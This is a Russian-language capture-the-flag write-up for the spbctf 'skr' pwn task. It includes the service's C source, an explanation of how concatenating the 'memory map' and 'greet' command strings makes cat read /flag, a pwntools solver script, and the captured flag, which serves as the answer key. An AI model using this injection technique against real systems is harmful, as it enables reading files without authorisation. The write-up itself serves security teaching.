[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn7_skr)
Описание:
Флаг лежит в /flag
`nc 109.233.56.90 11514`
**[skr](https://pwn.spbctf.ru/files/heap/skr/skr)**  
**[skr.c](https://pwn.spbctf.ru/files/heap/skr/skr.c)**

Исходный код:
``` C
#include<stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

#define N_COMMANDS 3

struct command {
        char buf[128];
        void (*free)(struct command *it);
        void (*exec)(struct command *it);
};

struct command *cmds[N_COMMANDS];

void pmenu() {
        puts("1. allocate command ");
        puts("2. prepare command ");
        puts("3. execute command");
        puts("4. free command");
}

void print_anchor() {
        printf("> ");
}

int read_int() {
        char tmp[0x40];
        if (fgets(tmp, 0x3f, stdin) == NULL) {
                return -1;
        }
        int res = atoi(tmp);
        return res;
}
int find_free_slot() {
        for (int i =0; i < N_COMMANDS; i++) {
                if (cmds[i] == NULL) {
                        return i;
                }
        }
        return -1;
}

void exec_command(struct command *it) {
        if (strlen(it->buf)) {
                system(it->buf);
        }
}

void free_command(struct command *it) {
        free(it);
}


int main(int argc, const char **argv, const char **envp)
{
  int op, n_read, idx;
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  char name[512];

  
  while (1) {
        pmenu();
        print_anchor();
        int op = read_int();
        if (op == -1) {                
                puts("wron menu item");
                return -1;
        }
        switch (op) {
                case 1:
                
                        idx = find_free_slot();
                        if (idx == -1) {
                                puts("no space left");
                                return -1;
                        }
                        cmds[idx] = malloc(sizeof(struct command));
                        cmds[idx]->free = free_command;
                        cmds[idx]->exec = exec_command;
                        bzero(cmds[idx]->buf, sizeof(cmds[idx]->buf));
                        printf("allocated command with id = %d\n", idx);
                        break;
                case 2:
                        puts("command id to prepare");
                        print_anchor();
                        idx = read_int();
                        if (idx < 0 || idx >= N_COMMANDS) {
                                puts("wrong id");
                                return -1;
                        }
                        if (cmds[idx] == NULL) {
                                puts("command with such id was not allocated");
                                return -1;
                        }
                        puts("Available command types:");
                        puts("1. greet ");
                        puts("2. memory map");
                        print_anchor();
                        op = read_int();
                        switch (op) {
                                case 1:
                                   puts("your name");
                                   print_anchor();
                                   bzero(name, sizeof(name));
                                   fgets(name, sizeof(name)-1, stdin);
                                   if (strlen(name) == 0 || strlen(name) > sizeof(cmds[idx]->buf) - 6) {
                                        puts("name too long");
                                        return -1;
                                   }
                                   if (name[strlen(name)-1] == '\n') {
                                        name[strlen(name)-1 ] = 0;
                                   }
                                   for (int i = 0; i < strlen(name); i++) {
                                        if (name[i] >= 'a' && name[i] <= 'z') {

                                        } else {
                                                printf("wrong char found at %d : %d\n", i, name[i]);
                                                return -1;
                                        }
                                   }
                                   strcat(cmds[idx]->buf, "echo ");
                                   strcat(cmds[idx]->buf, name);
                                   break;
                                case 2:
                                   strcpy(cmds[idx]->buf, "cat /proc/self/maps");
                                   break;
                        }
                        break;
                case 3:
                        puts("command id to execute");
                        print_anchor();
                        idx = read_int();
                        if (idx < 0 || idx >= N_COMMANDS) {
                                return -1;
                        }
                        if (cmds[idx] == NULL || cmds[idx]->buf[0] == 0) {
                                return -1;
                        }
                        cmds[idx]->exec(cmds[idx]);
                        break;
                case 4:
                        puts("command id to free");
                        print_anchor();
                        idx = read_int();
                        if (idx < 0 || idx >= N_COMMANDS) {
                                return -1;
                        }
                        if (cmds[idx] == NULL || cmds[idx]->buf[0] == 0) {
                                return -1;
                        }
                        cmds[idx]->free(cmds[idx]);
                        cmds[idx] = NULL;
                        break;
                default:
                        return -1;
        }
        
  }
  return 0;
}

__attribute__((constructor))
static void bufinit() {    
    alarm(64);
    setvbuf(stdout, 0, _IONBF, 0);
    setvbuf(stdin, 0, _IONBF, 0);
    setvbuf(stderr, 0, _IONBF, 0);
}
```
Обратить внимание стоит на функцию подготовки команды, а именно тип команды greet, он записывать данные в память при помощи конкатенации, из-за чего после создания команды можно выбрать тип `memory map`, а затем ещё раз выбрать подготовку команды и написать в имя flag, тогда cat попытается прочитать сразу 2 файла.

Вот так это выглядит в памяти:
![{6544FBD8-78D4-4EBD-96E1-56816C5AD0F3}](../../../../z.%20Images/{6544FBD8-78D4-4EBD-96E1-56816C5AD0F3}.png)

Солвер:
``` python
io = start()

io.sendlineafter(b'> ', b'1')      # создать команду

io.sendlineafter(b'> ', b'2')      # записать cat /proc/self/maps
io.sendlineafter(b'> ', b'0')
io.sendlineafter(b'> ', b'2')


io.sendlineafter(b'> ', b'2')      # конкатинировать echo flag
io.sendlineafter(b'> ', b'0')
io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'> ', b'flag')

io.sendlineafter(b'> ', b'3')      # запустить команду
io.sendlineafter(b'> ', b'0')

io.interactive()
```

Запуск:
![{E30C1A45-6465-44A0-903D-EFB0C47E63B8}](../../../../z.%20Images/{E30C1A45-6465-44A0-903D-EFB0C47E63B8}.png)

Ответ: `spbctf{28dd37d8b1388b9496967a0f616b2866}`